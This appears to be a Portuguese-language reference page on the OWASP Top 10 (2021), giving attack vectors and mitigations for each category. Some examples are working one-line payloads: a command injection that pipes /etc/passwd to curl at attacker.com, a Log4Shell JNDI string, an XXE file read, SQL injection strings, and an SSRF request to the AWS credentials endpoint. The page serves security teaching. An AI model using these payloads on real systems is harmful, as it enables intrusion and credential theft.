A01 Quebra de Controle de Acesso RISCO CRÍTICO

Falhas que permitem usuários agirem fora de suas permissões pretendidas — acessando dados, funções ou contas de outros usuários.

Versão OWASP

2021 — #1 (subiu de #5 em 2017)

CWEs mapeadas

CWE-22, CWE-284, CWE-285, CWE-639, CWE-862, CWE-863

Ocorrência

94% das aplicações testadas tinham alguma forma de controle de acesso quebrado

Vetores de Ataque

  • Acesso direto a URL por modificação de path (forced browsing): /admin/users
  • IDOR (Insecure Direct Object Reference): trocar id=123 por id=456 na query string
  • Escalada de privilégio vertical: user comum acessa funcionalidade de admin
  • Escalada horizontal: usuário A acessa dados do usuário B via manipulação de parâmetro
  • Bypass de CORS mal configurado: wildcard ou origem untrusted permitida
  • JWT com claim de role forjado por falta de validação server-side

Exemplos Técnicos

GET /api/orders?userId=999  → retorna pedidos de outro usuário
DELETE /api/users/1  → admin endpoint acessível sem verificação de role
Mitigações Principais

✓

Implementar deny-by-default: negar tudo, liberar explicitamente

✓

Validar permissões server-side em CADA request (nunca confiar no client)

✓

Usar IDs indiretos (GUIDs opacos) ou mapeamento server-side em vez de IDs sequenciais

✓

Registrar e alertar falhas de controle de acesso (audit log)

✓

Revisar políticas de CORS — nunca usar wildcard em APIs com dados sensíveis

✓

Invalidar tokens JWT corretamente no logout; usar JTI para revogação

A02 Falhas Criptográficas RISCO CRÍTICO

Proteção insuficiente de dados em trânsito ou em repouso. Antes chamado de 'Exposição de Dados Sensíveis', o foco agora é nas raízes criptográficas do problema.

Versão OWASP

2021 — #2 (era #3 em 2017)

CWEs mapeadas

CWE-261, CWE-296, CWE-310, CWE-319, CWE-321, CWE-326, CWE-327

Dados em risco

Senhas, cartões de crédito, PII, tokens, chaves privadas

Vetores de Ataque

  • Downgrade de TLS via POODLE, BEAST, ROBOT para descriptografar tráfego
  • Quebra de hashes MD5/SHA-1 por rainbow tables e GPU cracking
  • Senhas armazenadas em texto plano ou com hash sem salt
  • Chaves AES hardcoded no código-fonte ou em repositórios públicos
  • Transmissão de dados sensíveis via HTTP (sem TLS) em redes intermediadas
  • Uso de ECB mode em AES: revela padrões no ciphertext

Exemplos Técnicos

Hash: MD5('senha123') → quebrável em segundos via rainbow table
Bcrypt com work factor 4 (mínimo é 10–12 para senhas)
Mitigações Principais

✓

TLS 1.2+ obrigatório; desabilitar TLS 1.0/1.1, SSL 2/3; usar HSTS

✓

Hashing de senhas: bcrypt (cost >= 12), Argon2id, ou scrypt — nunca MD5/SHA-x

✓

Criptografia simétrica: AES-256-GCM; nunca usar ECB mode

✓

Chaves e segredos fora do código: usar vault (HashiCorp, AWS Secrets Manager)

✓

Cifras de fluxo autenticadas (AEAD) para garantir integridade + confidencialidade

✓

Verificar validade de certificados TLS; implementar Certificate Pinning em mobile

A03 Injeção RISCO CRÍTICO

Dados não confiáveis enviados a um interpretador como parte de um comando ou query. SQL Injection, NoSQL Injection, LDAP Injection, Command Injection, etc.

Versão OWASP

2021 — #3 (era #1 em 2017; XSS integrado aqui)

CWEs mapeadas

CWE-20, CWE-74, CWE-75, CWE-77, CWE-78, CWE-79, CWE-89, CWE-116

Mais comum

SQL Injection, Cross-Site Scripting (XSS), OS Command Injection

Vetores de Ataque

  • SQL Injection clássico: ' OR '1'='1 — bypass de autenticação
  • Blind SQLi: inferir dados via respostas booleanas ou tempo (SLEEP/WAITFOR)
  • Union-based SQLi: UNION SELECT username,password FROM users--
  • OS Command Injection: ; cat /etc/passwd | curl attacker.com
  • Stored XSS: script persistido no BD, executado em outros usuários
  • Reflected XSS: payload na URL refletido imediatamente na response
  • DOM-based XSS: manipulação do DOM client-side sem passar pelo servidor

Exemplos Técnicos

SELECT * FROM users WHERE user='$input'  → vulnerável
SELECT * FROM users WHERE user=?  → parametrizado, seguro
Mitigações Principais

✓

Prepared Statements / Parameterized Queries em TODA query ao banco

✓

ORM com proteção nativa a SQL Injection (Hibernate, SQLAlchemy, etc.)

✓

Validação de entrada: whitelist de caracteres permitidos, não blacklist

✓

Escapar saídas HTML/JS: usar bibliotecas como DOMPurify, OWASP Java Encoder

✓

Content Security Policy (CSP) para mitigar XSS — nonce/hash por script

✓

Least privilege no banco: conta da app sem DROP/ALTER; sem acesso a system tables

A04 Design Inseguro RISCO ALTO

Categoria nova em 2021. Falhas em controles de design e arquitetura — ameaças não modeladas, fluxos de negócio sem validação, ausência de segurança by design.

Versão OWASP

2021 — #4 (nova categoria)

CWEs mapeadas

CWE-73, CWE-183, CWE-209, CWE-256, CWE-501, CWE-522

Diferença chave

Não é falha de implementação — é ausência de controle desde a concepção

Vetores de Ataque

  • Fluxo de recuperação de senha que revela respostas secretas previsíveis
  • Lógica de negócio permitindo reservar -1 tickets ou comprar itens com preço negativo
  • API sem rate limiting: força bruta em OTP, senhas, vouchers
  • Multi-tenant app sem isolamento: dados de um tenant visíveis a outro por design
  • Workflow crítico sem etapa de confirmação (double-submit para transferências)

Exemplos Técnicos

Fluxo de checkout sem validar preço server-side — cliente altera valor no request
Reset de senha via e-mail com link sem expiração nem uso único
Mitigações Principais

✓

Threat Modeling (STRIDE, PASTA) em cada funcionalidade crítica

✓

Secure Design Patterns: fail-safe defaults, complete mediation, least privilege

✓

Validação de regras de negócio server-side — nunca confiar em client

✓

Rate limiting e CAPTCHA em todos os endpoints de autenticação e transações

✓

Testes de lógica de negócio (abuse cases) além de testes funcionais

✓

Revisão de segurança em arquitetura antes de codar (Architecture Risk Analysis)

A05 Configuração de Segurança Incorreta RISCO ALTO

Configurações padrão inseguras, features desnecessárias habilitadas, mensagens de erro verbosas, permissões excessivas em cloud ou infra.

Versão OWASP

2021 — #5 (era #6 em 2017; XML External Entities integrado)

CWEs mapeadas

CWE-2, CWE-11, CWE-13, CWE-15, CWE-16, CWE-260, CWE-520, CWE-611, CWE-732

Inclui

XXE (XML External Entities), headers HTTP, CORS, cloud IAM

Vetores de Ataque

  • Stack trace exposto em produção: revela framework, versões, paths internos
  • XXE: <!ENTITY xxe SYSTEM 'file:///etc/passwd'> para leitura de arquivos internos
  • Credenciais padrão em painéis admin: admin/admin, tomcat/tomcat
  • S3 Bucket público: listagem e download de dados sensíveis
  • Headers de segurança ausentes: sem X-Frame-Options, sem CSP, sem HSTS
  • Features de debug ativas em produção (debug=True no Django, actuator sem auth)

Exemplos Técnicos

Spring Boot Actuator exposto sem autenticação: /actuator/env, /actuator/dump
CORS: Access-Control-Allow-Origin: * em API com dados sensíveis
Mitigações Principais

✓

Infrastructure as Code (IaC) com hardening automatizado (CIS Benchmarks)

✓

Desabilitar features, serviços e endpoints não utilizados em produção

✓

Headers HTTP de segurança: HSTS, CSP, X-Frame-Options, X-Content-Type-Options

✓

Desabilitar parsing de XML external entities nos parsers XML

✓

Rotação de credenciais padrão; remover contas de demo/test em produção

✓

Ambientes isolados: dev/staging/prod com segredos e configs separados

A06 Componentes Vulneráveis e Desatualizados RISCO ALTO

Uso de bibliotecas, frameworks ou dependências com vulnerabilidades conhecidas (CVEs). Uma das formas mais fáceis de comprometer sistemas modernos.

Versão OWASP

2021 — #6 (era #9 em 2017)

CWEs mapeadas

CWE-937, CWE-1035, CWE-1104

Caso emblemático

Log4Shell (CVE-2021-44228) — CVSS 10.0, impacto global massivo

Vetores de Ataque

  • Exploração de Log4Shell: JNDI lookup via ${jndi:ldap://attacker.com/x}
  • Dependências transitivas vulneráveis não visíveis no manifest direto
  • CVEs em imagens Docker desatualizadas usadas em produção
  • Exploração de CMS desatualizados: WordPress plugins com RCE conhecido
  • Supply chain attack: pacote npm malicioso injetado em dependência popular

Exemplos Técnicos

pom.xml com Log4j 2.14.1 → vulnerável a JNDI injection (Log4Shell)
npm audit: 47 vulnerabilities (3 critical) — sem patch aplicado
Mitigações Principais

✓

Software Composition Analysis (SCA): Snyk, OWASP Dependency-Check, Dependabot

✓

SBOM (Software Bill of Materials) para rastrear todas as dependências

✓

Patch policy: janela máxima para aplicar CVEs críticos (ex: 48h para Critical)

✓

Pinning de versões de dependências + assinatura de artefatos (checksums)

✓

Imagens base mínimas (distroless, scratch) para reduzir superfície de ataque

✓

Scan automático de containers (Trivy, Grype) no pipeline CI/CD

A07 Falhas de Identificação e Autenticação RISCO ALTO

Confirmar identidade do usuário, autenticação e gerenciamento de sessão são críticos. Falhas permitem ataques de credential stuffing, brute force e session hijacking.

Versão OWASP

2021 — #7 (era #2 em 2017)

CWEs mapeadas

CWE-255, CWE-259, CWE-287, CWE-288, CWE-290, CWE-294, CWE-295, CWE-330

Técnicas comuns

Credential Stuffing, Brute Force, Session Fixation, JWT manipulation

Vetores de Ataque

  • Credential stuffing: uso de listas de credenciais vazadas (HaveIBeenPwned)
  • Brute force sem lockout: tentativas ilimitadas de senha
  • Session fixation: atacante define session ID antes do login
  • JWT com algoritmo 'none': header alg:none para bypassar verificação de assinatura
  • JWT com chave fraca: HS256 com segredo 'secret' quebrado por brute force
  • Cookie de sessão sem flag HttpOnly/Secure — roubável via XSS

Exemplos Técnicos

JWT: {alg:'none'} — servidor aceita token sem verificar assinatura
Session ID previsível: JSESSIONID=0001, 0002, 0003 → fixation/prediction
Mitigações Principais

✓

MFA obrigatório para contas privilegiadas; recomendado para todos os usuários

✓

Rate limiting e CAPTCHA em endpoints de login; lockout progressivo

✓

Não expor enumeração de usuários (mesma mensagem para user inválido e senha errada)

✓

Session IDs: gerados com CSPRNG; invalidados no logout; rotacionados pós-login

✓

Verificar algoritmo JWT explicitamente no servidor; rejeitar alg:none

✓

Implementar detecção de credential stuffing (IP reputation, device fingerprint)

A08 Falhas de Integridade de Software e Dados RISCO ALTO

Código e infraestrutura sem verificação de integridade. Inclui insecure deserialization e falhas na cadeia de suprimentos de software (CI/CD pipelines).

Versão OWASP

2021 — #8 (nova categoria unificada; incorpora insecure deserialization)

CWEs mapeadas

CWE-345, CWE-353, CWE-426, CWE-494, CWE-502, CWE-565, CWE-784, CWE-829

Caso real

SolarWinds: update malicioso distribuído via pipeline comprometido

Vetores de Ataque

  • Deserialization de objetos Java/PHP/Python sem validação: gadget chains para RCE
  • Auto-update de app sem verificar assinatura do artefato
  • Pipeline CI/CD com secrets em variáveis de ambiente sem proteção
  • Dependência de CDN externo sem Subresource Integrity (SRI)
  • npm install de pacote typosquatted (event-stream, ua-parser-js comprometidos)

Exemplos Técnicos

Java: ObjectInputStream.readObject() sem whitelist de classes → RCE via gadget chain
<script src='https://cdn.example.com/lib.js'> sem integrity hash
Mitigações Principais

✓

Verificar assinaturas digitais de artefatos, pacotes e updates (Sigstore, cosign)

✓

Não deserializar objetos de fontes não confiáveis; usar JSON em vez de serialização nativa

✓

Subresource Integrity (SRI) em todos os recursos externos de CDN

✓

Proteger pipeline CI/CD: least privilege, secrets em vault, scan de pipeline (SAST)

✓

Revisar dependências de supply chain; usar lock files e verificar checksums

✓

SLSA (Supply-chain Levels for Software Artifacts) framework para provenance

A09 Falhas de Registro e Monitoramento RISCO MÉDIO

Sem logging adequado e monitoramento, ataques não são detectados. Média de 287 dias para detecção de breach. Dificulta resposta a incidentes e forense.

Versão OWASP

2021 — #9 (era #10 em 2017)

CWEs mapeadas

CWE-117, CWE-223, CWE-532, CWE-778

Impacto

Sem logs: sem detecção, sem evidências forenses, sem compliance (LGPD, PCI-DSS)

Vetores de Ataque

  • Atacante efetua 10.000 tentativas de login sem alertas sendo disparados
  • Log injection: inserir newlines em logs para forjar entradas (\n200 OK Admin login)
  • Sensibilização de logs: inundar com eventos falsos para esconder atividade maliciosa
  • Exfiltração de dados em múltiplos requests pequenos abaixo de thresholds de alerta
  • Logs armazenados localmente: atacante apaga evidências pós-comprometimento

Exemplos Técnicos

Nenhum log para: falhas de autenticação, erros de controle de acesso, erros 4xx/5xx
Logs contendo senhas ou tokens em texto plano (via debug logging)
Mitigações Principais

✓

Logar: autenticações (ok/fail), acessos negados, erros de validação, transações críticas

✓

Centralizar logs em SIEM (Splunk, ELK, Azure Sentinel) fora do servidor comprometível

✓

Alertas em tempo real: N falhas de login em X segundos, acesso a paths sensíveis

✓

Nunca logar dados sensíveis: senhas, PAN, tokens, PII (sanitizar antes de logar)

✓

Log format estruturado (JSON) com campos padrão: timestamp, user, IP, action, result

✓

Garantir integridade dos logs: write-once storage, checksums, retenção por compliance

A10 Server-Side Request Forgery (SSRF) RISCO CRÍTICO

Forçar o servidor a fazer requests para destinos internos ou externos controlados pelo atacante. Critico em ambientes cloud com metadata services (AWS IMDS, GCP metadata).

Versão OWASP

2021 — #10 (nova entrada — adicionada por survey da comunidade)

CWEs mapeadas

CWE-918

Ambiente de risco

Cloud-native apps, microservices, webhooks, URL fetchers, PDF generators

Vetores de Ataque

  • http://169.254.169.254/latest/meta-data/ → roubo de credenciais IAM na AWS
  • SSRF para escanear rede interna: http://192.168.1.1, http://10.0.0.1/admin
  • Bypass de firewall: servidor faz request que firewall externo bloquearia do cliente
  • SSRF via redirect: servidor segue redirecionamentos para destino interno
  • Blind SSRF: sem response visível, mas interação confirmada via OOB (DNS/HTTP callback)
  • SSRF em parsers PDF/HTML que fazem fetch de recursos externos

Exemplos Técnicos

POST /api/fetch-url {url:'http://169.254.169.254/latest/meta-data/iam/security-credentials/'}
Webhook com URL controlada pelo atacante apontando para http://internal-api/admin
Mitigações Principais

✓

Whitelist de destinos permitidos (domínios/IPs) — nunca blacklist

✓

Bloquear ranges de IP privados: 10.x, 172.16-31.x, 192.168.x, 169.254.x (link-local)

✓

IMDSv2 na AWS: requer token em dois passos — mitiga SSRF clássico

✓

Não redirecionar responses de URLs externas diretamente ao cliente

✓

Firewall egress no servidor de aplicação: só permite destinos explicitamente necessários

✓

Usar DNS pinning e validar IP APÓS resolução DNS (prevenir DNS rebinding)
